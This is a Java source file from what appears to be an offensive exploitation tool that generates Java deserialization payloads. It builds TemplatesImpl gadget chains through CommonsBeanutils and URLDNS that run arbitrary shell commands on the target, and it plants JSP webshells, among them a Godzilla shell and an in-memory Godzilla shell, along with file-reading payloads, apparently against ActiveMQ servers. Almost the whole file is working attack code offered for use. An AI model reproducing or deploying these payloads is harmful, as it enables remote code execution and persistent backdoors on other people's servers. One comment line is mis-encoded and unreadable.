package sonomon.deser;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.Random;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import com.unboundid.util.Base64;
import sonomon.*;
import sonomon.deser.gadgets.CommonsBeanutils2;
import sonomon.deser.gadgets.FileRead;
import sonomon.deser.gadgets.Urldns;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

public class Deserialize {
	  public static class Foo implements Serializable {
		    private static final long serialVersionUID = 8207363842866235160L;
		  }
	  public static class StubTransletPayload extends AbstractTranslet implements Serializable {
		    private static final long serialVersionUID = -5971610431559700674L;
		    
		    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
		    
		    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
		  }
	  
	  public static Boolean isDefaultPayload() throws Exception {
	    	switch (Config.cmd) {
			case "cmdjsp":
		        return true;
			case "godzillajsp":
		        return true;
			case "memgodzilla":
		        return true;
			case "readfile":
		        return true;
			default:
		        return false;
			}
	  }
	  
	public static byte[] getjavaSerializedData(String gadget, String payload) throws Exception{
		switch (gadget) {
		case "urldns":
			return Urldns.getjavaSerializedData("all|jndiall", payload);
		case "cb19":
			return CommonsBeanutils2.getjavaSerializedData(payload, "commons-beanutils-1.9.3.jar");
		case "cb18":
			return CommonsBeanutils2.getjavaSerializedData(payload, "commons-beanutils-1.8.3.jar");
		default:
			System.out.print("[*] deser not this gadget "+gadget+"\r\n");
			return null;
		}
		
	}

	
	  public static TemplatesImpl getTemplatesImpl(String payload) throws Exception {		  
		  TemplatesImpl tempImpl = new TemplatesImpl();
		  setFieldValue(tempImpl, "_name", "TemplatesImpl");
		  setFieldValue(tempImpl, "_tfactory", new TransformerFactoryImpl());
		  String classname = null;
		  String setALL = null;
	    	switch (payload) {
			case "cmdjsp":
				classname = "exp.TemplatesImplActivemqWebshell";
				setALL = "{ this.url = \""+Config.url+"\";\r\n"
		        		+ "    	this.jsp = \""+payload.replace("jsp", ".jsp")+"\";\r\n"
		        		+ "    	this.webshell = \""+Payload.getcmdjsp()+"\"; }";
		        break;
			case "godzillajsp":
				classname = "exp.TemplatesImplActivemqWebshell";
				setALL = "{ this.url = \""+Config.url+"\";\r\n"
		        		+ "    	this.jsp = \""+payload.replace("jsp", ".jsp")+"\";\r\n"
		        		+ "    	this.webshell = \""+Payload.getcmdjsp()+"\"; }";
		        break;
			case "memgodzilla":
				classname = "exp.TemplatesImplMemGodzilla";
				setALL = "{ this.classname = \""+"exp.MemGodzilla"+"\";\r\n"
	            		+ "    	this.classbase64 = \""+Base64.encode(Payload.getClassBytes("exp.MemGodzilla",null))+"\"; }";
		        break;
			case "readfile":
				classname = "exp.TemplatesImplActivemqReadFile";
				setALL = "{ this.url = \""+Config.url+"\";}";
		        break;
			default:
				classname = "exp.TemplatesImplActivemqEcho";
				setALL = "{ this.url = \""+Config.url+"\";\r\n"
		            		+ "    	this.cmd = \""+Config.base64cmd+"\"; }";
				// ‘≠∞ÊŒﬁªÿœ‘cmd TemplatesImpl
				//tempImpl = (TemplatesImpl) Deserialize.createTemplatesImpl(payload);
				break;
			}

			setFieldValue(tempImpl, "_bytecodes", new byte[][]{
				Payload.getTemplatesImplClassBytes(classname,setALL)
			});
		  return tempImpl;
	  }
	
	  
	  public static Object createTemplatesImpl(String command) throws Exception {
	    if (Boolean.parseBoolean(System.getProperty("properXalan", "false")))
	      return createTemplatesImpl(command, 
	          Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"), 
	          Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"), 
	          Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl")); 
	    return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
	  }
	  
	  
	  public static <T> T createTemplatesImpl(String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
	    T templates = tplClass.newInstance();
	    ClassPool pool = ClassPool.getDefault();
	    pool.insertClassPath((javassist.ClassPath)new ClassClassPath(StubTransletPayload.class));
	    pool.insertClassPath((javassist.ClassPath)new ClassClassPath(abstTranslet));
	    CtClass clazz = pool.get(StubTransletPayload.class.getName());
	    command = command.replaceAll("\\\\", "\\\\\\\\").replaceAll("\"", "\\\"");
	    String cmd = "boolean isWin = java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\");"
	    		+ "String[] cmds = isWin ? new String[]{\"cmd.exe\", \"/c\", \""+command+"\"} : new String[]{\"/bin/sh\", \"-c\", \""+command+"\"};"
	    		+ "java.lang.Runtime.getRuntime().exec(cmds);";
	    clazz.makeClassInitializer().insertAfter(cmd);
	    clazz.setName("ysoserial.Pwner" + System.nanoTime());
	    CtClass superC = pool.get(abstTranslet.getName());
	    clazz.setSuperclass(superC);
	    byte[] classBytes = clazz.toBytecode();
	    setFieldValue(templates, "_bytecodes", new byte[][] { classBytes, 
	          ClassFiles.classAsBytes(Foo.class) });
	    setFieldValue(templates, "_name", "Pwnr");
	    setFieldValue(templates, "_tfactory", transFactory.newInstance());
	    return templates;
	  }
	  
	
	    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
	        Field field = getFieldValue(obj, fieldName);
	        field.setAccessible(true);
	        field.set(obj, value);
	    }
	    public static Field getFieldValue(Object obj, String fieldName) throws Exception {
	    	try {
	    		Field field = obj.getClass().getDeclaredField(fieldName);
	    		field.setAccessible(true);
	            return field;
			} catch (Exception e) {
				return getFieldValue(obj, obj.getClass(), fieldName);
			}
	    }
	    public static Field getFieldValue(Object obj, Class<?> clazz, String fieldName) throws Exception {
	    	Field field;
	    	clazz = clazz.getSuperclass();
	    	try {
	    		field = clazz.getDeclaredField(fieldName);
	    		field.setAccessible(true);
	            return field;
			} catch (Exception e) {
				return getFieldValue(obj, clazz, fieldName);
			}
	    }
	    
	    
	    public static String getRandomStr(int length) {
	    	String str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
	    	Random random1=new Random();
	    	StringBuffer sb=new StringBuffer();
	    	for (int i = 0; i < length; i++) {
	    		int number=random1.nextInt(str.length());
	    		char charAt = str.charAt(number);
	    		sb.append(charAt);
	    	}
	    	return sb.toString();
		}
  
  
  
	public static String bstobase64(byte [] bs) throws Exception {
		String base64 = new String(Base64.encode(bs));
		return base64;
	}
	
	public static byte[] objectToBytes(Object o){
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ObjectOutputStream os = null;
		try {
			os = new ObjectOutputStream(out);
		} catch (IOException e) {
			e.printStackTrace();
		}
        try {
			os.writeObject(o);
		} catch (IOException e) {
			e.printStackTrace();
		}
		return out.toByteArray();
	}
    public static String base64_encode(byte[] bs) throws Exception {
    	String base64;
        try {
       	 base64 = (String) Class.forName("sun.misc.BASE64Encoder").getMethod("encodeBuffer",byte[].class).invoke(Class.forName("sun.misc.BASE64Encoder").newInstance(), bs);
		} catch (Exception e) {
			Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
			base64 = (String) Class.forName("java.util.Base64$Encoder").getMethod("encodeToString",byte[].class).invoke(encoder, bs);
		}
        return base64.replace("\r\n", "");
       
	}
    public static byte[] base64_decode(String string) throws Exception {
    	byte[] bytes;
		try {
			try {
				Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
				bytes = (byte[]) Class.forName("java.util.Base64$Decoder").getMethod("decode",String.class).invoke(decoder, string);
			} catch (Exception e) {
				Object decoder = Class.forName("java.util.Base64").getMethod("getMimeDecoder").invoke(null);
				bytes = (byte[]) Class.forName("java.util.Base64$Decoder").getMethod("decode",String.class).invoke(decoder, string);
			}
		} catch (Exception e) {
			bytes = (byte[]) Class.forName("sun.misc.BASE64Decoder").getMethod("decodeBuffer",String.class).invoke(Class.forName("sun.misc.BASE64Decoder").newInstance(), string);
		}
		return bytes;
	}
}
